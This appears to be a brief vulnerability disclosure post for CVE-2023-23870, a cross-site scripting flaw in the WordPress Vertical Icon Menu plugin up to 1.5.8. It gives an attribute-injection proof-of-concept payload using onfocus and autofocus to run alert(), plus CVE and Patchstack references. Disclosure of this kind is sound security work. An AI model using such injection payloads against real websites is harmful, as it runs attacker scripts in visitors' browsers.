---
layout: post
title: CVE-2023-23870 - Vertical Icon Menu Plugin <= 1.5.8 - Cross Site Scripting (XSS)
---

Description
============
Vertical Icon Menu Plugin <= 1.5.8 This could allow a malicious actor to inject malicious scripts, such as redirects, advertisements, and other HTML payloads into your website which will be executed when guests visit your site.

Proof Of Concept
============
Payload

~~~
" onfocus=alert(/XSS/) autofocus="
~~~

References
============ 
  * [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-23870](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-23870)
  * [Patchstack](https://patchstack.com/database/vulnerability/wpdevart-vertical-menu/wordpress-responsive-vertical-icon-menu-plugin-1-5-8-cross-site-scripting-xss)



[Rio Darmawan](https://patchstack.com/database/researcher/0f0ce3de-fbab-4348-9729-a5ef92c74b3e)
